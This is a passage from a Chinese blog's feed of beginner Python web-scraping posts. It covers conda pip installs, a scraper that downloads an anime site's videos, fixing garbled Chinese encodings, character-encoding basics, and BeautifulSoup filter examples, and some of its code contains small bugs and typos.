title="使用conda当前环境的pip进行安装"></a>使用conda当前环境的pip进行安装</h3><p>使用<code>conda env list</code>查看当前使用的环境</p><p><img src="https://i.imgur.com/ETOzRXz.png"></p><p>找到环境下的<code>pip</code>在下载<code>mysqlclient</code>路径下执行以下命令</p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">conda环境路径\<span class="hljs-keyword">Scripts\pip.exe </span><span class="hljs-keyword">install </span>库文件<br></code></pre></div></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/11/XLjr7PsO8uN2nFW.png"></p>]]></content>
    
    
    <categories>
      
      <category>爬虫</category>
      
    </categories>
    
    
    <tags>
      
      <tag>conda</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>某动漫网站视频爬虫</title>
    <link href="/2020/09/10/%E6%9F%90%E5%8A%A8%E6%BC%AB%E7%BD%91%E7%AB%99%E8%A7%86%E9%A2%91%E7%88%AC%E8%99%AB/"/>
    <url>/2020/09/10/%E6%9F%90%E5%8A%A8%E6%BC%AB%E7%BD%91%E7%AB%99%E8%A7%86%E9%A2%91%E7%88%AC%E8%99%AB/</url>
    
    <content type="html"><![CDATA[<h2 id="某动漫网站视频爬虫"><a href="#某动漫网站视频爬虫" class="headerlink" title="某动漫网站视频爬虫"></a>某动漫网站视频爬虫</h2><p>上个月月底写的一个爬虫，获取一个动漫的所有视频</p><p>因为是小站，只测试下载了几个视频，理论可以把一个动漫的视频全部下载成功</p><p>为了不提升网站负担，这里就不给网站域名了</p><span id="more"></span><blockquote><p>初学爬虫，代码很菜······</p></blockquote><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Created on Fri Aug 28 17:21:10 2020</span><br><span class="hljs-string"></span><br><span class="hljs-string">@author: JKding233</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">网址:http://www.xxxxx/</span><br><span class="hljs-string">目的</span><br><span class="hljs-string">获取视频文件</span><br><span class="hljs-string">8月28日，代码功能基本实现</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getHTML</span>(<span class="hljs-params">url</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;访问网站获取页面，返回页面&quot;&quot;&quot;</span><br>    header = &#123;<br>        <span class="hljs-string">&#x27;Host&#x27;</span>:<span class="hljs-string">&#x27;www.xxxx&#x27;</span>,<br>        <span class="hljs-string">&#x27;User-agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0&#x27;</span><br>    &#125;<br>    r = requests.get(url,headers=header)<br>    r.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br>    <span class="hljs-keyword">return</span> r<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GetMp4HTML</span>(<span class="hljs-params">url</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;访问网站获取页面，返回页面&quot;&quot;&quot;</span><br>    header = &#123;<br>        <span class="hljs-string">&#x27;User-agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0&#x27;</span><br>    &#125;<br>    r = requests.get(url,headers=header)<br>    r.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br>    <span class="hljs-built_in">print</span>(r.status_code)<br>    <span class="hljs-keyword">return</span> r<br><br>      <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">processHTML</span>(<span class="hljs-params">r</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;使用bs4进行处理&quot;&quot;&quot;</span><br>    soup = BeautifulSoup(r.text,<span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>    <span class="hljs-keyword">return</span> soup<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GetLinksAndTitle</span>(<span class="hljs-params">url1,title,links</span>):</span><br>    r = getHTML(url1)<br>    soup = processHTML(r)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;要下载的动漫为：&#x27;</span>+<span class="hljs-built_in">str</span>(soup.h1.string))<br>    a = soup.findAll(style=<span class="hljs-string">&quot;display:block&quot;</span>)<br>    href = a[<span class="hljs-number">0</span>].find_all(<span class="hljs-string">&#x27;a&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(href)):<br>        title.append(href[i].text)<br>        links.append(<span class="hljs-string">&#x27;http://www.xxxx&#x27;</span> + href[i][<span class="hljs-string">&#x27;href&#x27;</span>])<br>    <br>        <br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getmp4</span>(<span class="hljs-params">link</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;提取页面中的视频文件链接&quot;&quot;&quot;</span><br>    r = getHTML(link)<br>    soup = processHTML(r)<br>    s = soup.select(<span class="hljs-string">&#x27;div#playbox&#x27;</span>)<br>    geturl = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;^https.*\.mp4&#x27;</span>)<br>    mo = geturl.search(s[<span class="hljs-number">0</span>].attrs[<span class="hljs-string">&#x27;data-vid&#x27;</span>])<br>    <span class="hljs-keyword">return</span>(<span class="hljs-built_in">str</span>(mo.group()))<br>    <span class="hljs-comment">#download(str(mo.group()), title)</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">download</span>(<span class="hljs-params">mp4link,title</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;下载视频&quot;&quot;&quot;</span><br>    <span class="hljs-comment">#r = GetMp4HTML(mp4link)</span><br>    <span class="hljs-built_in">print</span>(mp4link)<br>    <span class="hljs-keyword">try</span>:<br>         <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(title+<span class="hljs-string">&#x27;.mp4&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>             f.write(r.content)<br>             <span class="hljs-built_in">print</span>(title+<span class="hljs-string">&#x27;下载成功&#x27;</span>)<br>    <span class="hljs-keyword">except</span>:<br>         <span class="hljs-built_in">print</span>(title+<span class="hljs-string">&#x27;下载失败&#x27;</span>)<br>    <br>            <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    title = []<br>    links=[]<br>    url = <span class="hljs-string">&#x27;http://www.xxx/show/4790.html&#x27;</span><br>    GetLinksAndTitle(url, title, links)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(links)):<span class="hljs-comment">#下载全部使用len(links)</span><br>        mp4link = getmp4(links[i])<br>        download(mp4link, title[i])<br>main()<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>爬虫项目</category>
      
    </categories>
    
    
    <tags>
      
      <tag>爬虫项目</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>爬虫中文乱码及解决</title>
    <link href="/2020/09/08/%E7%88%AC%E8%99%AB%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81%E5%8F%8A%E8%A7%A3%E5%86%B3/"/>
    <url>/2020/09/08/%E7%88%AC%E8%99%AB%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81%E5%8F%8A%E8%A7%A3%E5%86%B3/</url>
    
    <content type="html"><![CDATA[<p>对爬虫的各种中文乱码问题的解决方法</p><span id="more"></span><h2 id="问题1：获取网站的中文显示乱码"><a href="#问题1：获取网站的中文显示乱码" class="headerlink" title="问题1：获取网站的中文显示乱码"></a>问题1：获取网站的中文显示乱码</h2><ul><li>代码中获得的网页响应体和网站的编码方式不同<h3 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h3></li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br>url = <span class="hljs-string">&#x27;http://w3school.com.cn/&#x27;</span><br>r = requests.get(url)<br><span class="hljs-built_in">print</span>(r.encoding)<br>soup = BeautifulSoup(r.text,<span class="hljs-string">&quot;lxml&quot;</span>)<br>xx = <span class="hljs-built_in">str</span>(soup.title.string)<br><span class="hljs-built_in">print</span>(xx)<br></code></pre></div></td></tr></table></figure><div class="hljs code-wrapper"><pre><code class="hljs">ISO-8859-1w3school ÔÚÏß½Ì³Ì</code></pre></div><p><code>ISO-8859-1 w3school ÔÚÏß½Ì³Ì</code></p><p>程序返回编码为ISO-8859-1，中文显示乱码</p><p>我们看一下网页的真实编码为’gb2312’</p><p><img src="https://s1.ax1x.com/2020/09/08/wlF7mF.png" alt="wlF7mF.png"></p><p>想让其中文显示正确</p><p><code>r.encoding = &#39;gb2312&#39;</code></p><p>就可以了</p><h2 id="问题2：非法字符抛出异常"><a href="#问题2：非法字符抛出异常" class="headerlink" title="问题2：非法字符抛出异常"></a>问题2：非法字符抛出异常</h2><ul><li>网站的编码不规范，一个页面里混入了多种编码，于是出现了非法字符</li></ul><p>使用ignore忽略这些非法字符</p><p><code>str.decode(&#39;GKB&#39;,&#39;igore&#39;)</code></p><p>decode的函数原型为<code>decode([encoding],[errors=&#39;strict&#39;])</code>,第二个变量为控制错误处理的方式，默认为strict，遇到非法字符时会抛出异常</p><p>(1)ignore 忽略其中的非法字符，仅显示有效字符<br>(2)replace 使用符号代替非法字符，如’?’或’\ufffd’<br>(3)xmlcharrefreplace 使用XML字符引用代替非法字符</p><h2 id="问题3：网页使用gzip压缩"><a href="#问题3：网页使用gzip压缩" class="headerlink" title="问题3：网页使用gzip压缩"></a>问题3：网页使用gzip压缩</h2><p>r.content会自动解码gzip和deflate传输编码的响应数据</p><h3 id="例"><a href="#例" class="headerlink" title="例"></a>例</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> chardet<br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://www.sina.com.cn/&#x27;</span><br>r = requests.get(url)<br>after_gzip = r.content<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;解压后字符串的编码为&#x27;</span>,chardet.detect(after_gzip))<br><span class="hljs-comment">#print(after_gzip.decode(&#x27;utf-8&#x27;))</span><br></code></pre></div></td></tr></table></figure><div class="hljs code-wrapper"><pre><code class="hljs">解压后字符串的编码为 &#123;&#39;encoding&#39;: &#39;utf-8&#39;, &#39;confidence&#39;: 0.99, &#39;language&#39;: &#39;&#39;&#125;</code></pre></div><h2 id="问题4：读写文件的中文乱码"><a href="#问题4：读写文件的中文乱码" class="headerlink" title="问题4：读写文件的中文乱码"></a>问题4：读写文件的中文乱码</h2><p>在使用python3读取和保存文件的时候，一定要注明编码方式</p><p>读取文件时声明编码方式</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">result_utf8 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test_utf-8.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;encoding=&#x27;</span>utf-<span class="hljs-number">8</span><span class="hljs-string">&#x27;).read()</span><br></code></pre></div></td></tr></table></figure><p>保存文件时声明编码方式</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;title.txt&#x27;</span>,<span class="hljs-string">&#x27;a+&#x27;</span>,<span class="hljs-string">&#x27;ecoding=&#x27;</span>utf-<span class="hljs-number">8</span><span class="hljs-string">&#x27;) as f:</span><br><span class="hljs-string">    f.write(title)</span><br><span class="hljs-string">    f.close()</span><br></code></pre></div></td></tr></table></figure><p>以上是对txt和cvs文件的处理方法，对于JOSN文件而言，当我们把带有中文的数据保存至josn文件时，默认会以unicode编码处理</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br>title = <span class="hljs-string">&#x27;我们 love 你们&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;title.json&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    json.dump([title],f)<br></code></pre></div></td></tr></table></figure><p><code>[&quot;\u6211\u4eec love \u4f60\u4eec&quot;]</code></p><p>希望能够显示出中文</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br>title =<span class="hljs-string">&#x27;我们 love 你们&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;title1.json&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    json.dump([title],f,ensure_ascii=<span class="hljs-literal">False</span>)<br></code></pre></div></td></tr></table></figure><p><code>[&quot;我们 love 你们&quot;]</code></p>]]></content>
    
    
    <categories>
      
      <category>爬虫</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编码</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>爬虫编码介绍</title>
    <link href="/2020/09/08/%E7%88%AC%E8%99%AB%E7%BC%96%E7%A0%81%E4%BB%8B%E7%BB%8D/"/>
    <url>/2020/09/08/%E7%88%AC%E8%99%AB%E7%BC%96%E7%A0%81%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h1><h2 id="字符编码"><a href="#字符编码" class="headerlink" title="字符编码"></a>字符编码</h2><p>字符串的编码有两大类</p><ul><li>通用的Unicode编码</li><li>将Unicode转化成的某种类型的编码，如UTF-8、GBK等</li></ul><span id="more"></span><blockquote><p>Unicode被称为万国码，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，大概包含了100多万个符号</p></blockquote><p>在ASCII中，英文字母只用一个字节表示就够了，但是用Unicode编码写英文时每个符号用两个字节，因此要将其中一个字节全部用0表示。</p><p>为了节省空间，开发了一些中间格式的字符集，被称为通用转换格式UTF，常见的有UTF-8和UTF-16</p><p>UTF-8编码规则：</p><p>（1）对于单字节的符号，字节的第1个位设为0，后面7位为这个符号的Unicode码。因此对于英语字母，UTF-8编码和ASCII码是相同的0</p><p>（2）对于n字节的符号（n&gt;1），第1个字节的前n位都设为1，第n+1位设为0，后面字节的前两位一律设为10，剩下的没有提及的二进制位全部为这个符号的Unicode码</p><h2 id="python的字符编码"><a href="#python的字符编码" class="headerlink" title="python的字符编码"></a>python的字符编码</h2><p> 在python3中，字符串的编码使用str和bytes两种类型</p><p> （1）str字符串：使用Unicode编码</p><p> （2）bytes字符串：使用将Unicode转化成的某种类型的编码，如UTF-8、GBK</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;我们&quot;</span><br>str_utf8 = <span class="hljs-built_in">str</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><span class="hljs-built_in">print</span>(str_utf8)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(str_utf8))<br></code></pre></div></td></tr></table></figure><div class="hljs code-wrapper"><pre><code class="hljs">b&#39;\xe6\x88\x91\xe4\xbb\xac&#39;&lt;class &#39;bytes&#39;&gt;</code></pre></div><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">str_decode = <span class="hljs-built_in">str</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><span class="hljs-built_in">print</span>(str_decode)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(str_decode))<br></code></pre></div></td></tr></table></figure><div class="hljs code-wrapper"><pre><code class="hljs">我们&lt;class &#39;str&#39;&gt;</code></pre></div><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> chardet<br>str_gbk = <span class="hljs-string">&quot;我们&quot;</span>.encode(<span class="hljs-string">&#x27;gbk&#x27;</span>)<br>chardet.detect(str_gbk)<br></code></pre></div></td></tr></table></figure><div class="hljs code-wrapper"><pre><code class="hljs">&#123;&#39;encoding&#39;: &#39;TIS-620&#39;, &#39;confidence&#39;: 0.8095977270813678, &#39;language&#39;: &#39;Thai&#39;&#125;</code></pre></div><p>如果想把UTF-8转成其他非unicode编码，那么必须decode成unicode，再encode为其它非unicode编码，如GBK</p><p>encode转换为其他非unicode编码的代码</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">str_utf8 = <span class="hljs-string">&quot;我们&quot;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>str_gbk = str_utf8.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).encode(<span class="hljs-string">&#x27;gbk&#x27;</span>)<br><span class="hljs-built_in">print</span>(str_gbk)<br></code></pre></div></td></tr></table></figure><div class="hljs code-wrapper"><pre><code class="hljs">b&#39;\xce\xd2\xc3\xc7&#39;</code></pre></div><p class='div-border green'>使用Requests获得网站内容后，发现中文显示乱码</p><p class='div-border green'>将某个字符decode的时候，字符中有非法字符，程序抛出异常</p><p class='div-border green'>网页使用gzip压缩，解析网页数据的时候中文不乱码显示</p><p class='div-border green'>写入和读取文件的时候，文件显示的字符串不是正确的中文</p>]]></content>
    
    
    <categories>
      
      <category>爬虫</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编码</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>过滤器</title>
    <link href="/2020/08/24/%E8%BF%87%E6%BB%A4%E5%99%A8/"/>
    <url>/2020/08/24/%E8%BF%87%E6%BB%A4%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><p>介绍 <code>find_all()</code> 方法前,先介绍一下过滤器的类型  ,这些过滤器贯穿整个搜索的API.过滤器可以被用在tag的name中,节点的属性中,字符串中或他们的混合中.</p><blockquote><p>摘录于<a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html#id25">https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html#id25</a></p></blockquote><span id="more"></span><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>最简单的过滤器是字符串.在搜索方法中传入一个字符串参数,Beautiful Soup会查找与字符串完整匹配的内容,下面的例子用于查找文档中所有的<code>&lt;b&gt;</code>标签:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">soup.find_all(<span class="hljs-string">&#x27;b&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>[&lt;b&gt;The Dormouse<span class="hljs-string">&#x27;s story&lt;/b&gt;]</span><br></code></pre></div></td></tr></table></figure><p>如果传入字节码参数,Beautiful Soup会当作UTF-8编码,可以传入一段Unicode 编码来避免Beautiful Soup解析编码出错</p><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>如果传入正则表达式作为参数,Beautiful Soup会通过正则表达式的 <code>match()</code> 来匹配内容.下面例子中找出所有以b开头的标签,这表示<code>&lt;body&gt;</code>和<code>&lt;b&gt;</code>标签都应该被找到:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> re<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> tag <span class="hljs-keyword">in</span> soup.find_all(re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&quot;^b&quot;</span>)):<br><span class="hljs-built_in">print</span>(tag.name)<br> body<br> b<br></code></pre></div></td></tr></table></figure><p>下面代码找出所有名字中包含”t”的标签:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> tag <span class="hljs-keyword">in</span> soup.find_all(re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&quot;t&quot;</span>)):<br><span class="hljs-built_in">print</span>(tag.name)<br> html<br> title<br></code></pre></div></td></tr></table></figure><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p>如果传入列表参数,Beautiful Soup会将与列表中任一元素匹配的内容返回.下面代码找到文档中所有<code>&lt;a&gt;</code>标签和<code>&lt;b&gt;</code>标签:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">soup.find_all([<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>])<br> [&lt;b&gt;The Dormouse<span class="hljs-string">&#x27;s story&lt;/b&gt;,</span><br><span class="hljs-string">  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,</span><br><span class="hljs-string">  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,</span><br><span class="hljs-string">  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]</span><br></code></pre></div></td></tr></table></figure><h3 id="True"><a href="#True" class="headerlink" title="True"></a>True</h3><p><code>True</code> 可以匹配任何值,下面代码查找到所有的tag,但是不会返回字符串节点</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">for</span> tag <span class="hljs-keyword">in</span> soup.find_all(<span class="hljs-literal">True</span>):<br>    <span class="hljs-built_in">print</span>(tag.name)<br>html<br>head<br>title<br>body<br>p<br>b<br>p<br>a<br>a<br>a<br>p<br></code></pre></div></td></tr></table></figure><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>如果没有合适过滤器,那么还可以定义一个方法,方法只接受一个元素参数 ,如果这个方法返回 <code>True</code> 表示当前元素匹配并且被找到,如果不是则反回 <code>False</code></p><p>下面方法校验了当前元素,如果包含 <code>class</code> 属性却不包含 <code>id</code> 属性,那么将返回 <code>True</code>:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">has_class_but_no_id</span>(<span class="hljs-params">tag</span>):</span><br>    <span class="hljs-keyword">return</span> tag.has_attr(<span class="hljs-string">&#x27;class&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> tag.has_attr(<span class="hljs-string">&#x27;id&#x27;</span>)<br></code></pre></div></td></tr></table></figure><p>将这个方法作为参数传入 <code>find_all()</code> 方法,将得到所有<code>&lt;p&gt;</code>标签:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">soup.find_all(has_class_but_no_id)<br><span class="hljs-comment"># [&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;,</span><br><span class="hljs-comment">#  &lt;p class=&quot;story&quot;&gt;Once upon a time there were...&lt;/p&gt;,</span><br><span class="hljs-comment">#  &lt;p 